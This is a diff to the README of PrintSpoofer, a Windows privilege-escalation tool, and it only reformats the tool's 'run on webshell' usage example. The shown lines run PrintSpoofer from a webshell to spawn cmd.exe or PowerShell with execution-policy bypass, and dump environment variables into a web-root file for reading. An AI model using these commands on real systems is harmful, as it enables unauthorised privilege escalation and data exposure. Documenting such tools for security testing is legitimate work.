@@ -101,9 +101,8 @@ C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
 
 ### Usage 4: run on webshell
 
-```
-/c C:\inetpub\wwwroot\PrintSpoofer.exe -c "c:\\windows\\system32\\cmd.exe /c set > C:\\inetpub\\wwwroot\\tmp.txt & exit" && 
-type C:\\inetpub\\wwwroot\\tmp.txt
+```cmd
+/c C:\inetpub\wwwroot\PrintSpoofer.exe -c "c:\\windows\\system32\\cmd.exe /c set > C:\\inetpub\\wwwroot\\tmp.txt & exit" && type C:\\inetpub\\wwwroot\\tmp.txt
 ```
 <p align="center">
   <img src="run_on_webshell.png">
